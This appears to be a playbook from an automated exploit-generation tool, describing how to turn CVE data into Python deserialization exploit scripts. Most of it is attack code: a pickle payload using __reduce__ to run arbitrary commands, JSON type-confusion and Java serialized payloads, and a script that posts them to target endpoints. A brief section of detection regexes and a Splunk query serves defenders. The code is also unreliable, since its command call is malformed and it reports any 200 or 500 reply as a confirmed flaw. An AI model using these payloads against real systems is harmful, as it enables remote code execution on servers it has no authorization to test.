# Deserialization Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for insecure deserialization vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: critical
- **Tags**: deserialization, insecure-deserialization, pickle, java-deserialization, exploit-generation, cve, T1203

## Context and Use-Cases
- Generate working deserialization exploits from CVE descriptions
- Test Python pickle deserialization vulnerabilities
- Test Java serialization attacks
- Test JSON deserialization with type confusion
- Useful for penetration testing, vulnerability validation, and security research
- Demonstrate critical impact through arbitrary code execution

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information. Example: `{"cve_id": "CVE-2024-1122", "description": "Insecure deserialization in session handler"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com/api/deserialize"}`
- **details** (dict, optional): Additional details. Example: `{}`

## Procedure
1. Parse CVE description to identify deserialization vulnerability
2. Generate Python exploit class with session management
3. Create `create_pickle_payload()` method for Python pickle exploitation
4. Implement `test_deserialization()` method testing multiple formats:
   - Python pickle (base64-encoded)
   - JSON with __type__ fields
   - Java serialization (magic bytes rO0AB)
5. Test different parameter names (data, payload, object, serialized)
6. Check responses for deserialization indicators
7. Return complete exploit script

## Examples

### Generated Exploit Script
```python
#!/usr/bin/env python3
# Deserialization Exploit for CVE-2024-1122
# Vulnerability: Insecure deserialization in session handler

import requests
import sys
import base64
import pickle
import json

class DeserializationExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def create_pickle_payload(self, command):
        """Create malicious pickle payload"""
        class ExploitPayload:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, ([command], ))
        
        payload = ExploitPayload()
        serialized = pickle.dumps(payload)
        encoded = base64.b64encode(serialized).decode()
        return encoded

    def test_deserialization(self):
        """Test for deserialization vulnerabilities"""
        print("[+] Testing deserialization vulnerability...")
        
        test_command = "ping -c 1 127.0.0.1"  # Safe test command
        
        # Test different serialization formats
        payloads = {
            "pickle": self.create_pickle_payload(test_command),
            "json": json.dumps({"__type__": "os.system", "command": test_command}),
            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
        }
        
        for format_type, payload in payloads.items():
            try:
                # Test different parameters
                test_params = ["data", "payload", "object", "serialized"]
                
                for param in test_params:
                    response = self.session.post(
                        self.target_url,
                        data={param: payload}
                    )
                    
                    # Check for deserialization indicators
                    if response.status_code in [200, 500] and len(response.text) > 0:
                        print(f"[+] Potential {format_type} deserialization found")
                        return True
            
            except Exception as e:
                continue
        
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com/deserialize")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = DeserializationExploit(target_url)
    
    print(f"[+] Deserialization Exploit for CVE-2024-1122")
    print(f"[+] Target: {target_url}")
    
    if exploit.test_deserialization():
        print("[+] Deserialization vulnerability confirmed!")
    else:
        print("[-] No deserialization vulnerability found")

if __name__ == "__main__":
    main()
```

### Usage Example
```bash
python3 deser_exploit.py http://target.com/api/session

# Output:
# [+] Deserialization Exploit for CVE-2024-1122
# [+] Target: http://target.com/api/session
# [+] Testing deserialization vulnerability...
# [+] Potential pickle deserialization found
# [+] Deserialization vulnerability confirmed!
```

## Indicators / Detection

### Detection Patterns
```regex
# Python pickle magic bytes (base64)
gASV|gAJ9|gAN9

# Java serialization magic bytes
rO0AB|aced0005

# JSON type confusion
"__type__"|"__class__"|"__proto__"
```

### Splunk Query
```spl
index=web_logs 
| regex _raw="(gASV|gAJ9|rO0AB|__type__|__class__|ObjectInputStream)"
| stats count by src_ip, uri
```

## Source Excerpts

### [S1] Deserialization Detection
```python
# From exploit_template.py lines 347-349
# Deserialization
elif any(keyword in description_lower for keyword in ["deserialization", "unserialize", "pickle"]):
    vuln_type = "deserialization"
```

### [S2] Pickle Payload Creation
```python
# From exploit_template.py lines 1172-1182
def create_pickle_payload(self, command):
    """Create malicious pickle payload"""
    class ExploitPayload:
        def __reduce__(self):
            import subprocess
            return (subprocess.call, ([command], ))
    
    payload = ExploitPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    return encoded
```
